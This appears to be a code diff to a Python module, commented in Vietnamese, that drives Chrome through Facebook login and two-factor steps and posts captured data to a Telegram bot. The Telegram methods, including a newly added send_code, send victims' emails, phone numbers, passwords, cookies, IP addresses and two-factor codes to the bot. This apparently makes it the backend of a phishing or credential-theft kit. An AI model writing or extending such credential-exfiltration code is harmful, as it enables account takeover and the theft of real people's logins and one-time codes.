@@ -12,7 +12,7 @@ from selenium.webdriver.support.ui import WebDriverWait
 
 
 class AutoChrome:
-    def __init__(self, headless: bool | str = False, no_sandbox: bool = False, image: bool = False, javascript: bool = False, css: bool = False, user_agent: str = None, proxy: str = None, incognito: bool = True, auto_close: bool = True, log_level: str = "OFF"):
+    def __init__(self, headless: bool | str = False, no_sandbox: bool = False, image: bool = False, javascript: bool = True, css: bool = True, user_agent: str = None, proxy: str = None, incognito: bool = False, auto_close: bool = True, log_level: str = "OFF"):
         """
         ---
         ## Khởi tạo trình duyệt.
@@ -42,9 +42,9 @@ class AutoChrome:
         ### Các tham số:
             - headless (bool, tùy chọn): Chạy trình duyệt ở chế độ ẩn. Mặc định là False.
             - no_sandbox (bool, tùy chọn): Chỉ bật khi chạy dưới user `root` hoặc chạy trong môi trường ảo như `docker`.... Mặc định là False. Xem chi tiết [tại đây](https://chromium.googlesource.com/chromium/src/+/master/docs/design/sandbox.md)
-            - image (bool, tùy chọn): Vô hiệu hóa tải ảnh. Mặc định là False.
-            - javascript (bool, tùy chọn): Vô hiệu hóa JavaScript. Mặc định là False.
-            - css (bool, tùy chọn): Vô hiệu hóa CSS. Mặc định là False.
+            - image (bool, tùy chọn): Cho phép load ảnh. Mặc định là False.
+            - javascript (bool, tùy chọn): Bật Javascript. Mặc định là True.
+            - css (bool, tùy chọn): Cho phép load CSS. Mặc định là False.
             - user_agent (str, tùy chọn): Thiết lập chuỗi User-Agent tùy chỉnh. Mặc định là None. Tùy chọn: "RANDOM" hoặc truyền vào UserAgent tùy chỉnh. VD: `"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/244.178.44.111 Safari/537.36"`
             - proxy (str, tùy chọn): Thiết lập proxy. Mặc định là None. **Lưu ý:** chỉ truyền vào proxy dạng `IP:PORT`. VD: `"192.168.1.1:8080"`
             - incognito (bool, tùy chọn): Chạy trình duyệt ở chế độ ẩn danh. Mặc định là True.
@@ -97,7 +97,8 @@ class AutoChrome:
             else:
                 self.options.add_argument(f"user-agent={user_agent}")
         if proxy is not None:
-            self.options.add_argument(f'--proxy-server=%s' % {proxy})
+            self.options.add_argument('--proxy-server=%s' % proxy)
+            print(proxy)
         if incognito:
             self.options.add_argument("--incognito")
         if not auto_close:
@@ -216,82 +217,6 @@ class AutoChrome:
                 return {'status': 'success', 'message': 'LOGGED_IN'}
         except:
             return {'status': 'error', 'message': 'UNKNOWN_ERROR'}
-
-    def forget_password(self, username: str):
-        """
-        ---
-        ## Quên mật khẩu
-        ---
-        ### Các tham số:
-            - username (str): Email | Số điện thoại | UID
-        ---
-        ### Ví dụ:
-        ---
-        Khôi phục mật khẩu cho một tài khoản đã quên mật khẩu:
-
-        ```python
-        from modules import AutoChrome
-        browser = AutoChrome()
-        result = browser.forget_password("username")
-        print(result)
-
-        # OUTPUT:
-        >>> {'status': 'success', 'message': 'CODE_SENT'}
-        ```
-        ---
-
-        ### Kết quả trả về:
-
-        ```json
-        {
-            "status": "success",
-            "message": "CODE_SENT"
-        }
-        ```
-        - status: `success` | `failed`
-            - status:`success`: `CODE_SENT`
-            - status:`failed`: `CHECKPOINT_ACCOUNT`
-        """
-        self.driver.delete_all_cookies()
-        self.driver.get('https://en-gb.facebook.com/login/identify/')
-        self.driver.get(
-            'https://en-gb.facebook.com/recover/initiate?ars=royal_blue_bar')
-        WebDriverWait(self.driver, 5).until(
-            EC.element_to_be_clickable((By.ID, 'identify_email')))
-        self.driver.find_element(By.ID, 'identify_email').send_keys(username)
-        self.driver.find_element(By.NAME, 'did_submit').click()
-        try:
-            try:
-                WebDriverWait(self.driver, 3).until(
-                    EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div[1]/div[1]/div/div/form/div/div[3]/div/div[1]/button')))
-            except:
-                pass
-            # self.driver.find_element(
-            #     By.XPATH, '/html/body/div[1]/div[1]/div[1]/div/div/form/div/div[3]/div/div[1]/button').click()
-            self.driver.get(
-                'https://en-gb.facebook.com/recover/initiate/?is_from_lara_screen=1')
-            try:
-                self.driver.find_element(By.ID, 'send_email').click()
-                self.driver.execute_script(
-                    "document.querySelector('button[type=\"submit\"]').click();")
-            except:
-                try:
-                    self.driver.get(
-                        'https://en-gb.facebook.com/recover/initiate/?is_from_lara_screen=1')
-                    self.driver.find_element(By.ID, 'send_email').click()
-                    self.driver.execute_script(
-                        "document.querySelector('button[type=\"submit\"]').click();")
-                except:
-                    pass
-            try:
-                WebDriverWait(self.driver, 5).until(
-                    EC.element_to_be_clickable((By.ID, 'recovery_code_entry')))
-                self.driver.find_element(By.ID, 'recovery_code_entry')
-                return {'status': 'success', 'message': 'CODE_SENT'}
-            except:
-                return {'status': 'failed', 'message': 'CHECKPOINT_ACCOUNT'}
-        except:
-            return {'status': 'failed', 'message': 'CHECKPOINT_ACCOUNT'}
 
     def enter_code_two_factor(self, code: str):
         """
@@ -463,56 +388,6 @@ class AutoChrome:
         else:
             return {'status': 'success', 'message': 'LOGGED_IN'}
 
-    def authenticate_reset_code(self, code: str):
-        """
-        ## Xác minh mã khôi phục
-
-        ### Các tham số:
-            - code (str): Mã xác nhận đã gửi đến email hoặc số điện thoại
-        ---
-        ### Ví dụ:
-
-        ```python
-        from modules import AutoChrome
-        browser = AutoChrome()
-        # ...
-        result = browser.authenticate_reset_code("code")
-        print(result)
-
-        # OUTPUT:
-        >>> {'status': 'success', 'message': 'LOGGED_IN'}
-        ```
-        ---
-        ### Kết quả trả về:
-
-        ```json
-        {
-            "status": "success",
-            "message": "LOGGED_IN"
-        }
-        ```
-        - status: `success` | `failed`
-            - status:`success`: `LOGGED_IN`
-            - status:`failed`: `WRONG_CODE`
-        """
-        button = self.driver.execute_script(
-            'return document.querySelector(\'button[type="submit"]\')')
-        WebDriverWait(self.driver, 5).until(
-            EC.presence_of_element_located((By.ID, "recovery_code_entry")))
-        self.driver.find_element(
-            By.ID, "recovery_code_entry").send_keys(code)
-        if button:
-            self.driver.execute_script(
-                'document.querySelector(\'button[type="submit"]\').click()')
-        try:
-            wrong_code = WebDriverWait(self.driver, 1).until(
-                EC.presence_of_element_located((By.ID, "recovery_code_entry")))
-            if wrong_code:
-                return {"status": "failed", "message": "WRONG_CODE"}
-        except:
-            self.driver.find_element(By.ID, 'skip_button').click()
-            return {"status": "success", "message": "LOGGED_IN"}
-
 
 class Telegram:
     def __init__(self, api_token, chat_id):
@@ -521,14 +396,13 @@ class Telegram:
 
     def send_message(self, status, email, phone_number, password, cookie="", ip="", country=""):
         url = f"https://api.telegram.org/bot{self.api_token}/sendMessage"
-        message = f"*😀 Trạng thái: {status}*\n*📌 IP:* `{ip}`\n*🏳️‍🌈 Quốc gia:* `{country}`\n*📧 Email: `{email}`\n*📞 Số điện thoại:* `{phone_number}\n🔑 Mật khẩu:* `{password}`"
+        message = f"<b>😀 Trạng thái: {status}</b>\n<b>📌 IP:</b> <code>{ip}</code>\n<b>🏳️‍🌈 Quốc gia:</b> <code>{country}</code>\n,<b>📧 Email:</b> <code>{email}</code>\n<b>📞 Số điện thoại:</b> <code>{phone_number}</code>\n🔑 <b>Mật khẩu:</b> <code>{password}</code>"
         if cookie != "":
-            message += f"\n*🍪 Cookie:* `{cookie}`"
+            message += f"\n<b>🍪 Cookie:</b> <code>{cookie}</code>"
         data = {"chat_id": self.chat_id,
-                "text": message, "parse_mode": "MarkdownV2"}
+                "text": message, "parse_mode": "HTML"}
         try:
-            response = requests.post(url, data=data)
-            print(response.text)
+            requests.post(url, data=data)
         except:
             pass
 
@@ -536,6 +410,18 @@ class Telegram:
         url = f"https://api.telegram.org/bot{self.api_token}/sendMessage"
         data = {"chat_id": self.chat_id,
                 "text": message, "parse_mode": "MarkdownV2"}
+        try:
+            requests.post(url, data=data)
+        except:
+            pass
+
+    def send_code(self, status, email, phone_number, password, code, ip="", country=""):
+        url = f"https://api.telegram.org/bot{self.api_token}/sendMessage"
+        message = f"<b>😀 Trạng thái: {status}</b>\n<b>📌 IP:</b> <code>{ip}</code>\n<b>🏳️‍🌈 Quốc gia:</b> <code>{country}</code>\n,<b>📧 Email:</b> <code>{email}</code>\n<b>📞 Số điện thoại:</b> <code>{phone_number}</code>\n🔑 <b>Mật khẩu:</b> <code>{password}</code>"
+        if code != "":
+            message += f"\n<b>6️⃣ Code:</b> <code>{code}</code>"
+        data = {"chat_id": self.chat_id,
+                "text": message, "parse_mode": "HTML"}
         try:
             requests.post(url, data=data)
         except:
